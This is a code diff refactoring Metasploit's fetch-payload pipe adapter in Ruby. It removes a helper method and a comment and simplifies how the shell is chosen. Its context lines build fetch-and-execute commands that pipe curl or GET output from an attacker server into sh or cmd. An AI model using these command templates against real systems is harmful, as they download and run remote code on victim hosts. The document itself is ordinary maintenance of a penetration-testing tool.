@@ -5,7 +5,6 @@ module Msf
   #
   ###
   module Payload::Adapter::Fetch::Pipe
-
     def _download_pipe(uripath)
       "#{srvnetloc}/#{uripath}"
     end
@@ -18,8 +17,6 @@ module Msf
     end
 
     def generate_pipe_command(uri)
-      # TODO: Make a check method that determines if we support a platform/server/command combination
-
       case datastore['FETCH_COMMAND'].upcase
       when 'WGET'
         return _generate_wget_pipe(uri)
@@ -30,15 +27,8 @@ module Msf
       end
     end
 
-    def pipe_srvuri
-      return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?
-
-      default_srvuri('pipe')
-    end
-
     def _generate_curl_pipe(uri)
-      execute_cmd = 'sh'
-      execute_cmd = 'cmd' if windows?
+      execute_cmd = windows? ? 'cmd' : 'sh'
       case fetch_protocol
       when 'HTTP'
         return "curl -s http://#{_download_pipe(uri)}|#{execute_cmd}"
@@ -65,8 +55,7 @@ module Msf
     # @return [String] The GET pipe command.
     def _generate_get_pipe(uri)
       # Specifying the method (-m GET) is necessary on OSX
-      execute_cmd = 'sh'
-      execute_cmd = 'cmd' if windows?
+      execute_cmd = windows? ? 'cmd' : 'sh'
       case fetch_protocol
       when 'HTTP'
         return "GET -m GET http://#{_download_pipe(uri)}|#{execute_cmd}"
@@ -81,7 +70,5 @@ module Msf
         fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
       end
     end
-
-
   end
 end
